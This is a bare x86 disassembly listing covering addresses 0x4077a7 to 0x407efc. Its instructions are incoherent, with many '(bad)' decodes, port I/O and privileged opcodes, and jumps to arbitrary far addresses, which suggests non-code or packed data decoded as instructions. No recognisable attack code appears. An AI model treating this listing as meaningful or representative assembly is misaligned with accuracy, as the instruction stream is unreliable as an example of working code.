  4077a7:	test   eax,0xc06e279
  4077ac:	or     al,0x69
  4077ae:	sub    DWORD PTR [edx+ebp*4-0x5301f8c4],ebx
  4077b5:	jmp    0x7f59:0x66eb2a36
  4077bc:	inc    edx
  4077bd:	and    cl,bl
  4077bf:	sbb    DWORD PTR [ebp+0x517083bc],ebx
  4077c5:	clc    
  4077c6:	xchg   BYTE PTR [ecx],dh
  4077c8:	cmp    bl,bl
  4077ca:	cmc    
  4077cb:	add    BYTE PTR [eax-0x6],bh
  4077ce:	std    
  4077cf:	cmp    eax,0x7f162fbe
  4077d4:	repz aaa 
  4077d6:	scas   al,BYTE PTR es:[edi]
  4077d7:	aas    
  4077d8:	test   al,0xc5
  4077da:	ja     0x4077fc
  4077dc:	scas   al,BYTE PTR es:[edi]
  4077dd:	mov    cl,0xf6
  4077df:	sub    edx,DWORD PTR [eax+0x71]
  4077e2:	test   BYTE PTR [ecx-0x1],cl
  4077e5:	loope  0x4077ab
  4077e7:	jno    0x407833
  4077e9:	mov    cl,BYTE PTR [eax+0x4db048ea]
  4077ef:	dec    edx
  4077f0:	stos   DWORD PTR es:[edi],eax
  4077f1:	adc    dh,ah
  4077f3:	neg    DWORD PTR [edi+0x64f0d774]
  4077f9:	sub    ecx,DWORD PTR [edx-0x55bf50cf]
  4077ff:	jle    0x40779d
  407801:	adc    DWORD PTR [ecx],eax
  407803:	lea    esi,[ebx+0x1a]
  407806:	sbb    DWORD PTR [eax+0x4e4fff88],eax
  40780c:	pop    ss
  40780d:	fs and bl,ch
  407810:	sub    edi,DWORD PTR [edx+0x2d223ab]
  407816:	inc    dh
  407818:	mov    ebp,0xe91788ae
  40781d:	mov    ch,0x1b
  40781f:	pop    es
  407820:	call   0xda770d6c
  407825:	ss xchg ecx,eax
  407827:	mov    ds:0xe807d7af,eax
  40782c:	xchg   edx,eax
  40782d:	outs   dx,BYTE PTR ds:[esi]
  40782e:	push   es
  40782f:	cmp    dl,BYTE PTR [esi]
  407831:	in     eax,0x9e
  407833:	dec    eax
  407834:	test   al,0x55
  407836:	jle    0x407863
  407838:	xor    edi,edx
  40783a:	push   ss
  40783b:	test   DWORD PTR ds:[esi],0x2cefbfad
  407842:	xchg   edi,eax
  407843:	sub    BYTE PTR ds:0x4a81d089,bl
  407849:	mov    bh,0x48
  40784b:	das    
  40784c:	mov    edi,0xd7d076ec
  407851:	mov    ebp,0x2342cea8
  407856:	or     DWORD PTR [eax-0x3e],ecx
  407859:	add    al,0x43
  40785b:	dec    ecx
  40785c:	jb     0x4078b1
  40785e:	enter  0x9fbc,0xbf
  407862:	cld    
  407863:	es xor edx,esp
  407866:	out    dx,eax
  407867:	jbe    0x4077fb
  407869:	mov    bl,bh
  40786b:	add    bh,al
  40786d:	outs   dx,DWORD PTR ds:[esi]
  40786e:	(bad)  
  40786f:	callw  0xd6d4
  407873:	std    
  407874:	adc    DWORD PTR [ebx],ebx
  407876:	jno    0x407893
  407878:	sub    eax,0x6f9e395c
  40787d:	add    BYTE PTR [eax+0x76c0156a],cl
  407883:	add    ebx,ebx
  407885:	rcr    DWORD PTR [edi+0x6f],0x45
  407889:	loope  0x4078e1
  40788b:	outs   dx,BYTE PTR ds:[esi]
  40788c:	out    dx,eax
  40788d:	inc    ebx
  40788e:	stos   DWORD PTR es:[edi],eax
  40788f:	pop    es
  407890:	js     0x407837
  407892:	stos   DWORD PTR es:[edi],eax
  407893:	shl    BYTE PTR [edi+0x18],1
  407896:	mov    dh,0xda
  407898:	cld    
  407899:	push   cs
  40789a:	xchg   ecx,eax
  40789b:	sahf   
  40789c:	push   esp
  40789d:	adc    al,0x5e
  40789f:	mov    cl,0xa1
  4078a1:	push   ebx
  4078a2:	and    edx,DWORD PTR [ebx]
  4078a4:	movzx  edx,BYTE PTR [eax]
  4078a7:	mov    esi,esi
  4078a9:	arpl   WORD PTR [eax],sp
  4078ab:	int3   
  4078ac:	xor    cl,BYTE PTR [eax]
  4078ae:	jecxz  0x4078ad
  4078b0:	mov    al,ds:0x64c62537
  4078b5:	lods   al,BYTE PTR ds:[esi]
  4078b6:	repnz popw ss
  4078b9:	mov    eax,ds:0xedf135ac
  4078be:	and    BYTE PTR [ecx+0x529aa36f],dh
  4078c4:	inc    ecx
  4078c5:	add    DWORD PTR [ebx-0x2a],esi
  4078c8:	xor    eax,0x4949d15
  4078cd:	mov    dl,0x8d
  4078cf:	jg     0x4078c1
  4078d1:	mov    WORD PTR [ebx+0x17],ds
  4078d4:	arpl   WORD PTR [edx+edi*8],bx
  4078d7:	hlt    
  4078d8:	sub    ebx,DWORD PTR [esi+0x31c808df]
  4078de:	mov    cl,0x8
  4078e0:	and    BYTE PTR [eax+0x74fbc2c],al
  4078e6:	jne    0x407934
  4078e8:	ret    0x1d3e
  4078eb:	js     0x4078d1
  4078ed:	push   0x35
  4078ef:	add    edi,esp
  4078f1:	push   ss
  4078f2:	inc    ebp
  4078f3:	sub    DWORD PTR gs:[edx-0x2e],ecx
  4078f7:	push   esi
  4078f8:	xchg   ecx,eax
  4078f9:	out    0xcf,eax
  4078fb:	sbb    BYTE PTR [edx+0x6d20c312],ch
  407901:	inc    edi
  407902:	sub    al,0xa2
  407904:	xchg   edx,eax
  407905:	xor    al,0xff
  407907:	inc    ebx
  407908:	in     al,dx
  407909:	pop    es
  40790a:	out    0x2f,al
  40790c:	out    0x1f,al
  40790e:	in     al,dx
  40790f:	pop    eax
  407910:	mov    bh,ch
  407912:	cmp    BYTE PTR [edx],0x6c
  407915:	ret    0x218e
  407918:	icebp  
  407919:	std    
  40791a:	jle    0x407989
  40791c:	inc    edx
  40791d:	(bad)  
  40791e:	ror    DWORD PTR [esi],1
  407920:	add    ecx,DWORD PTR [esi]
  407922:	sbb    bh,bh
  407924:	ret    0x145e
  407927:	clc    
  407928:	sti    
  407929:	pop    esp
  40792a:	aam    0x81
  40792c:	mov    bl,0x2
  40792e:	add    BYTE PTR [ebx-0x40457c07],bl
  407934:	mov    DWORD PTR [eax+0x8f9a11b],esi
  40793a:	ins    BYTE PTR es:[edi],dx
  40793b:	cmp    dh,dh
  40793d:	adc    eax,0xcbe74196
  407942:	shl    BYTE PTR [ecx-0x6fb870a7],1
  407948:	or     ah,al
  40794a:	mov    dl,0xfd
  40794c:	fidivr DWORD PTR [eax+0x6]
  40794f:	adc    BYTE PTR [eax],bh
  407951:	sub    DWORD PTR [ecx+0x516843a1],0xc16a1264
  40795b:	ss push ds
  40795d:	lods   al,BYTE PTR ds:[esi]
  40795e:	inc    edi
  40795f:	fnstsw WORD PTR [ecx+0x31901944]
  407965:	lods   al,BYTE PTR ds:[esi]
  407966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407967:	xor    edx,DWORD PTR [ebx+0x72]
  40796a:	xchg   edi,eax
  40796b:	push   cs
  40796c:	inc    esi
  40796d:	bound  ecx,QWORD PTR [eax+0x14]
  407970:	dec    edx
  407971:	hlt    
  407972:	jmp    0x4079ca
  407974:	mov    esi,0x580f515b
  407979:	cld    
  40797a:	not    DWORD PTR [edi+edx*2-0x42]
  40797e:	cdq    
  40797f:	out    0x52,al
  407981:	jl     0x407942
  407983:	mov    eax,0x9d4a57e
  407988:	dec    esp
  407989:	jne    0x407985
  40798b:	and    dh,dl
  40798d:	and    DWORD PTR [ebx+0x18ad24ce],edi
  407993:	pop    ss
  407994:	and    BYTE PTR [ecx+edx*2-0x2c756741],cl
  40799b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40799c:	dec    esp
  40799d:	mov    esi,0xaff013b1
  4079a2:	push   0xec91d87c
  4079a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a8:	pop    edi
  4079a9:	pop    ecx
  4079aa:	fisttp DWORD PTR [ecx-0x51]
  4079ad:	(bad)  
  4079ae:	in     al,0xb0
  4079b0:	div    esi
  4079b2:	inc    ebx
  4079b3:	pop    ecx
  4079b4:	jmp    0x407939
  4079b6:	arpl   WORD PTR [ebx],si
  4079b8:	hlt    
  4079b9:	int    0x7c
  4079bb:	xchg   ecx,eax
  4079bc:	(bad)  
  4079be:	ret    
  4079bf:	or     bh,bl
  4079c1:	push   esi
  4079c2:	adc    edx,DWORD PTR [ebp-0x18]
  4079c5:	adc    DWORD PTR [esi],edx
  4079c7:	fldenv [ecx+0xb]
  4079ca:	inc    eax
  4079cb:	test   al,bl
  4079cd:	xchg   DWORD PTR [edx-0x12915f96],esp
  4079d3:	dec    eax
  4079d4:	dec    eax
  4079d5:	pop    ecx
  4079d6:	lock fwait
  4079d8:	arpl   bx,dx
  4079da:	hlt    
  4079db:	daa    
  4079dc:	mov    ch,0xd5
  4079de:	hlt    
  4079df:	xor    al,0xab
  4079e1:	and    esp,DWORD PTR [esi+0x32]
  4079e4:	loop   0x4079df
  4079e6:	loopne 0x407a26
  4079e8:	adc    BYTE PTR [ecx+0xb],0x13
  4079ec:	mov    dh,0xdf
  4079ee:	repz sbb ebx,edi
  4079f1:	popa   
  4079f2:	mov    ch,0xda
  4079f4:	loope  0x407a1e
  4079f6:	sbb    eax,DWORD PTR [eax]
  4079f8:	stos   BYTE PTR es:[edi],al
  4079f9:	add    ebx,esp
  4079fb:	cwde   
  4079fc:	ins    DWORD PTR es:[edi],dx
  4079fd:	add    esi,DWORD PTR [eax]
  4079ff:	add    al,dh
  407a01:	jl     0x407a7c
  407a03:	add    BYTE PTR [edx-0xba65d0d],al
  407a09:	out    0x3b,eax
  407a0b:	je     0x4079bf
  407a0d:	int3   
  407a0e:	lods   eax,DWORD PTR ds:[esi]
  407a0f:	fcom   QWORD PTR [edi-0x65]
  407a12:	adc    ebx,DWORD PTR ds:0x57b16f74
  407a18:	mov    ds:0xb31abb3c,al
  407a1d:	add    dl,BYTE PTR [ebp-0x30a7d86a]
  407a23:	mov    gs,WORD PTR [eax]
  407a25:	sub    DWORD PTR [ebx+0x498d4914],0xffffffa4
  407a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a2d:	or     ecx,ebp
  407a2f:	test   DWORD PTR [eax+ebx*4-0x2e],eax
  407a33:	push   ebx
  407a34:	std    
  407a35:	add    DWORD PTR ds:0xe6d70f06,edi
  407a3b:	mov    bh,0xc1
  407a3d:	data16 (bad) 
  407a40:	mov    ah,0xc7
  407a42:	add    BYTE PTR [ecx],cl
  407a44:	inc    esi
  407a45:	gs sahf 
  407a47:	arpl   WORD PTR [edi+0x3522ab96],cx
  407a4d:	mov    ds:0xefeeaf0f,al
  407a52:	mov    eax,ds:0xa2aa96ef
  407a57:	rcr    BYTE PTR [ebp-0x62],1
  407a5a:	cmp    DWORD PTR [ecx],ebp
  407a5c:	sbb    edi,DWORD PTR [esi-0x28]
  407a5f:	push   edx
  407a60:	shl    BYTE PTR [ebp+0x56],0x72
  407a64:	(bad)  
  407a65:	push   esp
  407a66:	gs data16 loopne 0x407ab0
  407a6a:	lahf   
  407a6b:	stos   BYTE PTR es:[edi],al
  407a6c:	jb     0x407a54
  407a6e:	jae    0x407ada
  407a70:	test   DWORD PTR [edi-0x6e],esp
  407a73:	mov    ah,0x74
  407a75:	icebp  
  407a76:	pop    eax
  407a77:	lods   al,BYTE PTR ds:[esi]
  407a78:	cli    
  407a79:	adc    bl,cl
  407a7b:	enter  0xa3df,0x8c
  407a7f:	jl     0x407ac5
  407a81:	sbb    esi,DWORD PTR [edi-0xe8dc56d]
  407a87:	push   ss
  407a88:	ins    DWORD PTR es:[edi],dx
  407a89:	ins    BYTE PTR es:[edi],dx
  407a8a:	fadd   st(3),st
  407a8c:	push   edx
  407a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8e:	sub    DWORD PTR [esi],esi
  407a90:	add    bl,BYTE PTR [ebx]
  407a92:	sar    BYTE PTR [edx],0x9e
  407a95:	idiv   BYTE PTR [ebx]
  407a97:	sahf   
  407a98:	ds into 
  407a9a:	ror    ch,cl
  407a9c:	mov    WORD PTR [ecx+esi*1+0x67],gs
  407aa0:	or     al,0xb9
  407aa2:	popa   
  407aa3:	bound  edi,QWORD PTR [edi]
  407aa5:	cli    
  407aa6:	jae    0x407b07
  407aa8:	enter  0xa371,0x94
  407aac:	pushf  
  407aad:	sub    ebx,eax
  407aaf:	das    
  407ab0:	or     DWORD PTR [eax],eax
  407ab2:	call   0x8e3e:0xa36b26ed
  407ab9:	pop    edi
  407aba:	imul   edi,ebp,0xffffffc6
  407abd:	rcr    DWORD PTR [ebp+0x23d088db],cl
  407ac3:	mov    ebp,0x9fae84c1
  407ac8:	xchg   DWORD PTR [ecx-0x44],eax
  407acb:	inc    ebx
  407acc:	inc    edx
  407acd:	ja     0x407af2
  407acf:	lea    edi,[ebp-0x1b]
  407ad2:	xchg   edx,eax
  407ad3:	mov    edx,0x7e1ecc7a
  407ad8:	ins    DWORD PTR es:[edi],dx
  407ad9:	(bad)  
  407ada:	xlat   BYTE PTR ds:[ebx]
  407adb:	jmp    0x3f90b7d5
  407ae0:	in     al,0x95
  407ae2:	repnz xchg ecx,eax
  407ae4:	jb     0x407a9b
  407ae6:	xchg   ecx,eax
  407ae7:	imul   BYTE PTR [ecx]
  407ae9:	push   esi
  407aea:	jge    0x407b29
  407aec:	adc    BYTE PTR [eax],ch
  407aee:	cld    
  407aef:	mov    cl,0x86
  407af1:	daa    
  407af2:	retf   
  407af3:	sub    BYTE PTR [edx],dl
  407af5:	mov    ah,bl
  407af7:	call   0x24b:0xf655b36c
  407afe:	push   es
  407aff:	sar    esp,cl
  407b01:	pop    eax
  407b02:	and    ebp,DWORD PTR [edx+0x1d48e8c]
  407b08:	fmul   st,st(1)
  407b0a:	xor    DWORD PTR [eax+0x40],0x77
  407b0e:	adc    al,0xc
  407b10:	dec    eax
  407b11:	mov    ebx,0xe84e1818
  407b16:	mov    eax,0x36894dec
  407b1b:	xor    DWORD PTR [esi],esi
  407b1d:	loop   0x407afd
  407b1f:	gs pop esi
  407b21:	xchg   ecx,eax
  407b22:	jg     0x407b4f
  407b24:	pop    edx
  407b25:	mov    ds:0xdb4cbe68,eax
  407b2a:	xchg   ch,dl
  407b2c:	push   0x32
  407b2e:	xor    bl,BYTE PTR [ecx-0x6e]
  407b31:	dec    ebp
  407b32:	sub    esi,DWORD PTR [eax+0x5dbced2b]
  407b38:	outs   dx,DWORD PTR ds:[esi]
  407b39:	lods   eax,DWORD PTR ds:[esi]
  407b3a:	in     eax,dx
  407b3b:	mov    ecx,0xefad3941
  407b40:	inc    edx
  407b41:	mov    edi,0x119addd
  407b46:	or     eax,0xf279c7cf
  407b4b:	mov    bl,0x58
  407b4d:	pmullw mm0,QWORD PTR [edx]
  407b50:	out    dx,al
  407b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b52:	imul   edi,DWORD PTR [edx+0x78],0xffffffa0
  407b56:	push   es
  407b57:	callw  0xe76
  407b5b:	sbb    ebp,ecx
  407b5d:	out    dx,eax
  407b5e:	mov    ebp,0x9f1c0243
  407b63:	int3   
  407b64:	je     0x407b38
  407b66:	xchg   edi,eax
  407b67:	push   eax
  407b68:	add    bl,BYTE PTR [ebx+esi*1+0x42]
  407b6c:	and    dh,BYTE PTR [esi+0x77c4fc4a]
  407b72:	mov    ah,0xd5
  407b74:	jmp    0xb5bfcd7d
  407b79:	sub    BYTE PTR [ebx+0x50],bh
  407b7c:	cld    
  407b7d:	loop   0x407b0d
  407b7f:	xchg   esp,eax
  407b80:	add    al,0xff
  407b82:	mov    dh,BYTE PTR [ebx]
  407b84:	dec    ebp
  407b85:	inc    edi
  407b86:	sbb    DWORD PTR [eax],eax
  407b88:	mov    al,ds:0xb41dd66
  407b8d:	push   ebp
  407b8e:	add    BYTE PTR [edx],bh
  407b90:	(bad)  
  407b91:	dec    ecx
  407b92:	jno    0x407bca
  407b94:	aam    0xd2
  407b96:	adc    BYTE PTR [eax-0x53c9c631],ch
  407b9c:	ins    BYTE PTR es:[edi],dx
  407b9d:	add    DWORD PTR [eax-0x5],ecx
  407ba0:	xchg   al,cl
  407ba2:	(bad)
  407ba6:	pop    edi
  407ba7:	lods   al,BYTE PTR ds:[esi]
  407ba8:	push   es
  407ba9:	in     al,dx
  407baa:	retf   
  407bab:	dec    esp
  407bac:	mov    BYTE PTR [edx],ch
  407bae:	(bad)  
  407baf:	retf   
  407bb0:	iret   
  407bb1:	mov    gs,WORD PTR [edx+0x71dd6349]
  407bb7:	dec    ecx
  407bb8:	fld    DWORD PTR [ebp+0x6]
  407bbb:	and    al,0x9e
  407bbd:	add    DWORD PTR [esi+0x7efe81bb],ebp
  407bc3:	pop    edx
  407bc4:	jnp    0x407b90
  407bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bc7:	div    edx
  407bc9:	cmp    BYTE PTR [esi-0x7e004530],bl
  407bcf:	inc    eax
  407bd0:	cmp    ecx,esp
  407bd2:	loop   0x407bd8
  407bd4:	add    bl,BYTE PTR [eax]
  407bd6:	ds int3 
  407bd8:	std    
  407bd9:	jae    0x407c54
  407bdb:	inc    edi
  407bdc:	pushf  
  407bdd:	ficom  WORD PTR [eax+0x1b]
  407be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be1:	aas    
  407be2:	test   al,0xaa
  407be4:	fadd   QWORD PTR [ecx+0x4de0f58b]
  407bea:	(bad)  
  407beb:	loop   0x407be1
  407bed:	or     eax,edi
  407bef:	(bad)  
  407bf0:	push   0x135aa927
  407bf5:	sahf   
  407bf6:	jne    0x407c15
  407bf8:	mov    bl,0xb3
  407bfa:	lock dec ebp
  407bfc:	mov    ?,WORD PTR [edx+0x16]
  407bff:	int3   
  407c00:	inc    ebp
  407c01:	adc    eax,0x87612e65
  407c06:	or     eax,0x44aec015
  407c0b:	pushf  
  407c0c:	repz mov dl,BYTE PTR [edx-0x31]
  407c10:	mov    al,0x4b
  407c12:	iret   
  407c13:	retf   
  407c14:	sbb    DWORD PTR ds:0x1b70e3f0,ebx
  407c1a:	fiadd  WORD PTR [ebx-0x983120e]
  407c20:	in     eax,dx
  407c21:	scas   al,BYTE PTR es:[edi]
  407c22:	fisub  DWORD PTR [esi+eax*8-0x2d]
  407c26:	and    eax,0x83990ed
  407c2b:	lock call DWORD PTR [eax+0x7b37514e]
  407c32:	or     al,0x84
  407c34:	xor    edi,edi
  407c36:	ror    BYTE PTR [eax-0x7e],1
  407c39:	scas   al,BYTE PTR es:[edi]
  407c3a:	iret   
  407c3b:	dec    esp
  407c3c:	rcr    DWORD PTR [edi-0x18],cl
  407c3f:	in     eax,dx
  407c40:	fucomip st,st(4)
  407c42:	mov    eax,0x5cfdfb00
  407c47:	(bad)  
  407c48:	jnp    0x407c13
  407c4a:	add    BYTE PTR [eax],dl
  407c4c:	data16 icebp 
  407c4e:	aaa    
  407c4f:	scas   eax,DWORD PTR es:[edi]
  407c50:	ja     0x407c3b
  407c52:	repz loopne 0x407c48
  407c55:	jg     0x407cae
  407c57:	mov    dh,0x2e
  407c59:	out    dx,al
  407c5a:	sbb    DWORD PTR [ebx],edx
  407c5c:	mov    ebp,0x3eb28d27
  407c61:	dec    ebx
  407c62:	push   0x8d24742f
  407c67:	out    0x8,al
  407c69:	add    bh,dl
  407c6b:	sbb    al,0x24
  407c6d:	add    al,BYTE PTR [esi]
  407c6f:	xor    BYTE PTR [edi-0x37],0x86
  407c73:	sbb    edx,DWORD PTR [ecx]
  407c75:	retf   0x51e7
  407c78:	jnp    0x407c29
  407c7a:	fwait
  407c7b:	push   ds
  407c7c:	mov    DWORD PTR [edi-0x47],edx
  407c7f:	test   DWORD PTR [ebp+0x52597b4],edi
  407c85:	mov    al,bh
  407c87:	test   al,0x85
  407c89:	xchg   DWORD PTR [ebp-0x5577bf4a],ebp
  407c8f:	inc    ebx
  407c90:	int3   
  407c91:	cmp    al,0x62
  407c93:	or     esi,DWORD PTR [eax+0x6b174062]
  407c99:	rcr    DWORD PTR ds:0xe55eb1ef,cl
  407c9f:	mov    edx,0xe13d4a8e
  407ca4:	out    dx,eax
  407ca5:	scas   eax,DWORD PTR es:[edi]
  407ca6:	or     DWORD PTR [esi+0x4951c269],0x1
  407cad:	or     BYTE PTR [ecx+0x29],0x76
  407cb1:	pop    ecx
  407cb2:	aas    
  407cb3:	ret    
  407cb4:	(bad)  
  407cb5:	pop    ebx
  407cb6:	fucomi st,st(3)
  407cb8:	cmp    edx,ebp
  407cba:	scas   eax,DWORD PTR es:[edi]
  407cbb:	aad    0x64
  407cbd:	lds    ebx,FWORD PTR [esi]
  407cbf:	aam    0xbb
  407cc1:	jge    0x407cdc
  407cc3:	mov    ebp,eax
  407cc5:	cmp    al,0xb
  407cc7:	mov    dh,0xae
  407cc9:	xor    dh,BYTE PTR [esp+ebp*4+0x5e]
  407ccd:	mov    ds:0x613571f6,eax
  407cd2:	es stc 
  407cd4:	ficomp WORD PTR [ebx]
  407cd6:	pop    ecx
  407cd7:	stc    
  407cd8:	(bad)  
  407cd9:	es popf 
  407cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cdc:	dec    esi
  407cdd:	cmp    al,0x7e
  407cdf:	arpl   dx,dx
  407ce1:	inc    ebp
  407ce2:	mov    cl,0xbb
  407ce4:	dec    ebp
  407ce5:	test   DWORD PTR [edi-0x5d],edx
  407ce8:	add    ebp,ebp
  407cea:	adc    eax,0xf14c0091
  407cef:	int3   
  407cf0:	adc    ebx,esp
  407cf2:	std    
  407cf3:	push   edi
  407cf4:	mov    bl,0x3a
  407cf6:	jo     0x407cfd
  407cf8:	int    0xd2
  407cfa:	cdq    
  407cfb:	inc    edx
  407cfc:	aaa    
  407cfd:	std    
  407cfe:	ja     0x407d79
  407d00:	xchg   BYTE PTR [edx+0x39e145b8],ah
  407d06:	stc    
  407d07:	iret   
  407d08:	xor    al,0x45
  407d0a:	wrmsr  
  407d0c:	test   al,0xbd
  407d0e:	xor    ebx,edx
  407d10:	inc    esi
  407d11:	pmaddwd mm4,QWORD PTR ds:0xf1e8f8e9
  407d18:	inc    esi
  407d19:	out    dx,al
  407d1a:	add    eax,DWORD PTR [edx-0xc6241ab]
  407d20:	lds    esi,FWORD PTR [eax]
  407d22:	xchg   BYTE PTR [esi],bh
  407d24:	std    
  407d25:	sbb    al,0xbd
  407d27:	jo     0x407d5a
  407d29:	add    BYTE PTR [ecx+0x73],ah
  407d2c:	and    ecx,DWORD PTR [eax+eax*1]
  407d2f:	mov    al,0x20
  407d31:	and    BYTE PTR [ebx],bh
  407d33:	adc    dh,bl
  407d35:	mov    al,ds:0xbfb67e29
  407d3a:	call   0x37e69359
  407d3f:	inc    ebp
  407d40:	push   edx
  407d41:	jae    0x407d26
  407d43:	shr    DWORD PTR [edx+eiz*8],cl
  407d46:	lahf   
  407d47:	mov    ds:0x57cedc13,al
  407d4c:	(bad)  
  407d4d:	push   edi
  407d4e:	xor    al,0x76
  407d50:	dec    ebp
  407d51:	inc    esi
  407d52:	or     BYTE PTR [esi-0x7e],ch
  407d55:	sbb    esp,ebp
  407d57:	add    al,0xaf
  407d59:	lods   al,BYTE PTR ds:[esi]
  407d5a:	lock scas al,BYTE PTR es:[edi]
  407d5c:	inc    eax
  407d5d:	lahf   
  407d5e:	xchg   bh,ah
  407d60:	add    al,0x36
  407d62:	sbb    DWORD PTR [ebx-0x67],0xcd224c81
  407d69:	(bad)  
  407d6a:	fidivr DWORD PTR [esi+eiz*8+0x35]
  407d6e:	repz or ecx,edi
  407d71:	sahf   
  407d72:	es xchg ebp,eax
  407d74:	xor    esi,edx
  407d76:	scas   al,BYTE PTR es:[edi]
  407d77:	test   BYTE PTR [edx-0x12b940d2],dl
  407d7d:	xor    cl,dh
  407d7f:	pop    ds
  407d80:	jge    0x407d47
  407d82:	or     al,0x9d
  407d84:	enter  0xa8d4,0x7e
  407d88:	mov    ds:0xe7062728,al
  407d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d8e:	icebp  
  407d8f:	cs cmp al,0xa2
  407d92:	lahf   
  407d93:	add    eax,0x91cfd786
  407d98:	repnz pop esi
  407d9a:	sbb    DWORD PTR [edi-0x2c],ebp
  407d9d:	pushf  
  407d9e:	clc    
  407d9f:	sbb    eax,0xdedc95a1
  407da4:	pop    ecx
  407da5:	push   ds
  407da6:	mov    bl,0x2e
  407da8:	lea    edi,[esi]
  407daa:	or     al,ah
  407dac:	scas   al,BYTE PTR es:[edi]
  407dad:	push   0xebbd80c0
  407db2:	es jle 0x407d3b
  407db5:	jno    0x407e0d
  407db7:	dec    ebp
  407db8:	out    dx,al
  407db9:	in     al,dx
  407dba:	sbb    BYTE PTR [eax+0x1],dl
  407dbd:	dec    eax
  407dbe:	mov    gs,WORD PTR [edx]
  407dc0:	adc    cl,BYTE PTR [ebx+0x7117b542]
  407dc6:	pop    edi
  407dc7:	and    BYTE PTR [ebx],ah
  407dc9:	aam    0x80
  407dcb:	push   eax
  407dcc:	xor    dl,ch
  407dce:	iret   
  407dcf:	fsubr  st(7),st
  407dd1:	cli    
  407dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd3:	repnz test ah,bl
  407dd6:	push   ebx
  407dd7:	push   ebx
  407dd8:	scas   al,BYTE PTR es:[edi]
  407dd9:	push   eax
  407dda:	das    
  407ddb:	in     al,0x75
  407ddd:	scas   al,BYTE PTR es:[edi]
  407dde:	jno    0x407de2
  407de0:	mov    eax,DWORD PTR [edx]
  407de2:	shl    BYTE PTR [edx-0x65],0x48
  407de6:	call   0x4043:0xb3d4df55
  407ded:	or     al,0x62
  407def:	sahf   
  407df0:	xchg   DWORD PTR [ebx+0x35],esp
  407df3:	mov    edx,0x71b67c66
  407df8:	sbb    eax,0x7f4644c3
  407dfd:	ret    
  407dfe:	cmc    
  407dff:	mov    WORD PTR [edx-0x80],ds
  407e02:	xchg   ebp,eax
  407e03:	adc    al,0xcc
  407e05:	repz inc ebx
  407e07:	push   edx
  407e08:	cli    
  407e09:	in     al,dx
  407e0a:	mov    al,ds:0xdb0007ae
  407e0f:	adc    DWORD PTR [esi-0x22],edx
  407e12:	(bad)  
  407e13:	mov    ch,0x29
  407e15:	std    
  407e16:	or     ebp,DWORD PTR [esi]
  407e18:	cmp    BYTE PTR [ebx+0x1d46829],dl
  407e1e:	pop    edi
  407e1f:	sti    
  407e20:	xchg   ebx,eax
  407e21:	dec    ebp
  407e22:	push   ebp
  407e23:	xlat   BYTE PTR ds:[ebx]
  407e24:	add    dh,BYTE PTR [edi+0x6f]
  407e27:	pop    ecx
  407e28:	(bad)  
  407e29:	jmp    0x9e07cf83
  407e2e:	aad    0x32
  407e30:	pop    ebp
  407e31:	stos   DWORD PTR es:[edi],eax
  407e32:	jne    0x407eac
  407e34:	inc    ebx
  407e35:	mov    al,0xfc
  407e37:	out    dx,al
  407e38:	pop    ebx
  407e39:	fld    DWORD PTR [edi-0x3]
  407e3c:	popf   
  407e3d:	gs jb  0x407e4a
  407e40:	sub    al,0x92
  407e42:	mov    dh,0x17
  407e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e45:	in     al,dx
  407e46:	cmp    BYTE PTR [esi-0x151c596e],dh
  407e4c:	cli    
  407e4d:	pusha  
  407e4e:	cld    
  407e4f:	cmp    al,0xcd
  407e51:	sbb    DWORD PTR [ebp-0x4a],esp
  407e54:	add    al,0x6
  407e56:	and    eax,0x8b97348
  407e5b:	aam    0xd8
  407e5d:	stc    
  407e5e:	(bad)  
  407e5f:	dec    eax
  407e60:	dec    esp
  407e61:	imul   bp,WORD PTR [ebp-0x20f0535d],0x11
  407e69:	out    dx,eax
  407e6a:	xchg   esp,eax
  407e6b:	sbb    BYTE PTR [eax],al
  407e6d:	adc    BYTE PTR [edx+eax*1-0x18],dl
  407e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e72:	push   eax
  407e73:	pop    ebp
  407e74:	(bad)  
  407e76:	pop    esi
  407e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e78:	cmp    eax,0xa67a0189
  407e7d:	inc    esp
  407e7e:	mov    dl,0x3a
  407e80:	sub    BYTE PTR [esi],0x64
  407e83:	sub    esp,esp
  407e85:	push   0xdba68c4f
  407e8a:	sub    WORD PTR [ebp-0x16],bx
  407e8e:	xchg   esi,eax
  407e8f:	out    0x22,eax
  407e91:	call   DWORD PTR [ebx+eiz*2-0x66]
  407e95:	jg     0x407ece
  407e97:	aad    0x46
  407e99:	(bad)  
  407e9a:	mov    cl,0x4
  407e9c:	add    BYTE PTR [esi-0x4be85539],al
  407ea2:	add    DWORD PTR [eax+edx*1+0x832585],edi
  407ea9:	pusha  
  407eaa:	mov    ecx,es
  407eac:	call   0x912896e0
  407eb1:	add    esi,edx
  407eb3:	mov    ch,0x7c
  407eb5:	cmp    ecx,DWORD PTR [ebx+0xec911af]
  407ebb:	inc    esp
  407ebc:	mov    cl,0x54
  407ebe:	sbb    bl,ah
  407ec0:	(bad)  
  407ec1:	or     eax,0x4299a3ad
  407ec6:	test   DWORD PTR [ecx-0x25babd83],ebx
  407ecc:	cmp    DWORD PTR [ebx-0x30df2297],ebp
  407ed2:	lahf   
  407ed3:	ret    0xd4b4
  407ed6:	cmp    ebx,DWORD PTR [edi+eax*8+0x23]
  407eda:	cdq    
  407edb:	popa   
  407edc:	cmc    
  407edd:	push   cs
  407ede:	arpl   WORD PTR [edx+ecx*4+0x78a6f0c2],cx
  407ee5:	mov    esp,0xcfc2dc28
  407eea:	mov    edi,0x1cc6ae35
  407eef:	loope  0x407ea4
  407ef1:	jmp    FWORD PTR [esi]
  407ef3:	aad    0x9e
  407ef5:	call   0x8b15:0x336d0fb7
  407efc:	adc    BYTE PTR [esi+0x23451dbc],bl
